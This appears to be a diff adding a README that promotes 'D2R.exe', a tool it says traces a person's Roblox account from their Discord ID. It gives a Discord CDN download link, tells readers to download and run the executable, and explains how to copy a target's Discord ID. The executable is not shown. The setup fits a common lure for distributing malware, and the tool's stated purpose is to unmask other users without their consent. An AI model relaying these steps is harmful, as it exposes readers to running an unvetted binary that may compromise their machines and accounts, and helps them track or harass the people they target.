@@ -1,0 +1,21 @@
+MANY PEOPLE DON'T GIVE OUT THEIR ROBLOX ACCOUNT.  -- TRACING METHOD 
+
+Some person has created an EXE to trace their Roblox with  "'DISCORD ID"" ...
+
+How to setup? 
+
+VIRUSTOTAL
+ https://www.virustotal.com/gui/file/ebde7106a8e56811493eda2cdaa93634f8b1b0ebca9535eda747cdfd26a34b29/detection
+
+DOWNLOAD:  https://cdn.discordapp.com/attachments/832716329949331536/833113570338275368/D2R.exe
+
+1.) Download the EXE and RUN IT.
+
+2.) In Discord, click the Gear icon next to your name in the lower left corner. Click Advanced under App Settings on the left hand side. Developer Mode is the first option in the Advanced page. Click the Toggle icon next to it to enable developer mode.
+
+3.) On PC find your desired target and right click their profile it should open up a prompt then click "COPY ID"
+
+4.) Last but not least PASTE their ID in the D2R.exe
+
+RESULTS should be like this.
+https://cdn.discordapp.com/attachments/833113900231950342/833115531396644884/unknown.png
